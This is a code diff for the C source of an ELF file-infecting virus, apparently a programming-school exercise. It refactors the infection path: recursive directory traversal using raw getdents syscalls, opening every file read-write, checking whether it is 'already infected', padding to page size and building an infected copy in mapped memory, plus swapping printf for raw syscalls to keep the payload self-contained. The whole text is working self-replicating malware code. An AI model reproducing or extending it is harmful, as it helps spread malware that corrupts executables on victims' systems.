@@ -56,17 +56,13 @@ void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 }
 
-void	try_open_file(t_elf *virus_elf, char *path, char *filename)
+void	try_open_file(t_elf *virus_elf, char *file)
 {
 	int				ret;
 	int				fd;
 	t_elf			elf;
 	void			*header[64];
-	char			file[ft_strlen(path) + ft_strlen(filename) + 2];
 
-	ft_strcpy(file, path);
-	ft_strcat(file, "/");
-	ft_strcat(file, filename);
 	fd = syscall_open(file, O_RDWR);
 	if (fd > 0)
 	{
@@ -99,6 +95,7 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 					}
 					int		size_needed = get_size_needed(&elf, virus_elf);
 					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
+					/*
 					if (DEBUG)
 					{
 						printf("previous size: %ld\n", elf.size);
@@ -108,6 +105,7 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 						printf("total addition: %d\n", size_needed + nb_zero_to_add);
 						printf("final size: %ld\n", elf.size + size_needed + nb_zero_to_add);
 					}
+					*/
 					char	*new;
 					new = syscall_mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
 					if (!new)
@@ -128,7 +126,10 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 					syscall_munmap(new, elf.size + size_needed + nb_zero_to_add);
 				}
 				else if (DEBUG)
-					printf("%s already infected.\n", file);
+				{
+					ft_putstr(file);
+					ft_putstr(" already infected.\n");
+				}
 			}
 		}
 		else if (DEBUG)
@@ -137,26 +138,8 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 	}
 }
 
-void	print_dirent(struct linux_dirent *linux_dir)
-{
-	printf("%8ld  ", linux_dir->d_ino);
-	char d_type = *((char *)linux_dir + linux_dir->d_reclen - 1);
-	printf("%-10s ", (d_type == DT_REG) ?  "regular" :
-					(d_type == DT_DIR) ?  "directory" :
-					(d_type == DT_FIFO) ? "FIFO" :
-					(d_type == DT_SOCK) ? "socket" :
-					(d_type == DT_LNK) ?  "symlink" :
-					(d_type == DT_BLK) ?  "block dev" :
-					(d_type == DT_CHR) ?  "char dev" : "???");
-	printf("%4d %10jd  %s\n", linux_dir->d_reclen,
-	(intmax_t) linux_dir->d_off, linux_dir->d_name);
-
-}
-
 void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
 {
-//	DIR				*dir;
-//	struct			dirent *d;
 	char			new_path[ft_strlen(path) + ft_strlen(d_name) + 2];
 	char			buffer[1024];
 	struct stat		statbuf;
@@ -179,12 +162,15 @@ void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
 			{
 				long					bpos;
 				struct linux_dirent		*linux_dir;
-				printf("==============> %s <================\n", new_path);
+				if (DEBUG)
+				{
+					ft_putstr("-> ");
+					ft_putstr(new_path);
+					ft_putstr("\n");
+				}
 				for (bpos = 0; bpos < nread;)
 				{
 					linux_dir = (void *)buffer + bpos;
-					if (ft_strcmp(linux_dir->d_name, ".") && ft_strcmp(linux_dir->d_name, ".."))
-						print_dirent(linux_dir);
 					if (bpos + linux_dir->d_reclen > nread)
 					{
 						rest = linux_dir->d_reclen;
@@ -202,31 +188,15 @@ void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
 					bpos += linux_dir->d_reclen;
 				}
 			}
-			printf("nread %d\n", nread);
+			//printf("nread %d\n", nread);
 		}
 		syscall_close(fd);
 	}
 	else
-		printf("%s: %d\n", new_path, statbuf.st_mode);
-	/*
-	dir = opendir(new_path);
-	if (dir)
 	{
-		while ((d = readdir(dir)))
-		{
-			if (ft_strcmp(d->d_name, ".") && ft_strcmp(d->d_name, ".."))
-			{
-				if (d->d_type == DT_DIR)
-					moving_through_path(virus_elf, new_path, d->d_name);
-				else
-					try_open_file(virus_elf, new_path, d->d_name);
-			}
-		}
-		closedir(dir);
+		//printf("%s: %d\n", new_path, statbuf.st_mode);
+		try_open_file(virus_elf, new_path);
 	}
-	else if (DEBUG)
-		debug_print_error(0, virus_elf->filename, path);
-	*/
 }
 
 int		main(int argc, char *argv[])
@@ -270,7 +240,7 @@ int		main(int argc, char *argv[])
 			syscall_close(fd);
 		}
 		else
-			printf("Host\n");
+			syscall_write(STDOUT_FILENO, "Host\n", 5);
 		// TODO: Host infection
 	}
 	else if (DEBUG)
